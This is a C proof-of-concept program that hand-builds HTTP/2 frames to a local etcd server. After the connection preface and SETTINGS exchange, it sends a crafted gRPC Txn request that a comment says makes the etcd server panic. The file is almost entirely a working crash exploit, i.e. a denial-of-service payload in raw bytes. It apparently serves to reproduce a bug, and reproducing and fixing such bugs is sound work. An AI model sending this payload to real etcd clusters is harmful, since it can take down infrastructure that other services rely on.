#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <assert.h>
#include <ctype.h>
#include <fcntl.h>

int
readn(int fd, void *xbuf, int n)
{
  char *buf = (char *) xbuf;
  int orig = n;
  while(n > 0){
    int cc = read(fd, buf, n);
    if(cc < 0) { perror("read"); return -1; }
    if(cc == 0) { return -1; }
    n -= cc;
    buf += cc;
  }
  return orig;
}

int
readframe(int s)
{
  unsigned char buf[4096];
  if(readn(s, (char*)buf, 9) < 0)
    return -1;
  int len = buf[2] | (buf[1] << 8) | (buf[0] << 16);
  if(readn(s, (char *)(buf+9), len) < 0)
    return -1;
  printf("S: ");
  for(int i = 0; i < len + 9; i++)
    printf("%02x ", buf[i]);
  printf("\n");
  return 0;
}

void
readframes(int s)
{
  while(1){
    usleep(100000);
    int n = 0;
    if(ioctl(s, FIONREAD, &n) != 0) perror("FIONREAD");
    if(n <= 0)
      break;
    readframe(s);
  }
}

void
w(int s, char *buf, int n)
{
  printf("C: ");
  if(n >= 1024 && buf[n-1] == 0xff){
    printf("ff ...\n");
  } else {
    for(int i = 0; i < n; i++)
      printf("%02x ", buf[i] & 0xff);
    printf("\n");
  }
  char *b = malloc(n+16);
  memcpy(b, buf, n);
  if(write(s, b, n) != n) perror("write");
  free(b);
}

int
main(){
  setlinebuf(stdout);
  struct rlimit r;
  r.rlim_cur = r.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &r);
  signal(SIGPIPE, SIG_IGN);
  sync();

#if 0
  system("GOTRACEBACK=all ETCD_UNSUPPORTED_ARCH=riscv64 stdbuf -o 0 -e 0 /etcd/bin/etcd > out 2>&1 &");
  sleep(10);
  system("ETCDCTL_API=3 /etcd/bin/etcdctl put a 1");
  system("ETCDCTL_API=3 /etcd/bin/etcdctl put b 1");
  system("ETCDCTL_API=3 /etcd/bin/etcdctl get a");
#endif

  struct sockaddr_in sin;
  memset(&sin, 0, sizeof(sin));
  sin.sin_family = AF_INET;
  sin.sin_port = htons(2379);
  sin.sin_addr.s_addr = inet_addr("127.0.0.1");
  printf("connecting to 127.0.0.1:2379...\n");

  int s = socket(AF_INET, SOCK_STREAM, 0);
  if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0){
    perror("connect");
    exit(1);
  }

  {
    char pri[] = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
    if(write(s, pri, strlen(pri)) <= 0) perror("write pri");
    char buf[512];
  }

  // read an http/2.0 SETTINGS frame from the server
  readframe(s);

  // send a SETTINGS frame to the server
  { char data[] = { 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00 };
    w(s, data, sizeof(data)); }

  // recv server's SETTINGS ACK
  readframes(s);

  // send a SETTINGS ACK
  { char data[] = { 0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00 };
    w(s, data, sizeof(data)); }

  // send HEADERS for txn
  { char data[] = { 0x00, 0x00, 0x56, 0x01, 0x04, 0x00, 0x00, 0x00, 0x01, 0x83, 0x86, 0x45, 0x8f, 0x60, 0xa9, 0x24, 0x88, 0x2d, 0x9d, 0xcb, 0x65, 0x71, 0xaf, 0x9b, 0x8b, 0x1b, 0xfc, 0xd5, 0x41, 0x8a, 0x08, 0x9d, 0x5c, 0x0b, 0x81, 0x70, 0xdc, 0x13, 0x2e, 0xbf, 0x5f, 0x8b, 0x1d, 0x75, 0xd0, 0x62, 0x0d, 0x26, 0x3d, 0x4c, 0x4d, 0x65, 0x64, 0x7a, 0x8a, 0x9a, 0xca, 0xc8, 0xb4, 0xc7, 0x60, 0x2b, 0xb2, 0xf2, 0xe0, 0x40, 0x02, 0x74, 0x65, 0x86, 0x4d, 0x83, 0x35, 0x05, 0xb1, 0x1f, 0x40, 0x8d, 0x25, 0x06, 0x2d, 0x49, 0x58, 0x75, 0x99, 0x6e, 0xe5, 0xb1, 0x06, 0x3d, 0x5f, 0x03, 0x68, 0x51, 0xed };
    w(s, data, sizeof(data)); }
   
  // send txn < etcd.txn RPC
  // This is the data which causes etcd server panic.
  { char data[] = { 0x00, 0x00, 0x28, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x23, 0x0a, 0x0a, 0x08, 0x01, 0x10, 0x03, 0x1a, 0x01, 0x61, 0x3a, 0x01, 0x30, 0x12, 0x09, 0x12, 0x07, 0x0a, 0x01, 0x62, 0x12, 0x02, 0x39, 0x39, 0x1a, 0x0a, 0x12, 0x08, 0x0a, 0x01, 0x63, 0x12, 0x03, 0x39, 0x39, 0x39 };
    w(s, data, sizeof(data)); }

  // recv server headers and reply
  readframes(s);

  sleep(5);
  readframes(s);
  sleep(5);
  readframes(s);
}
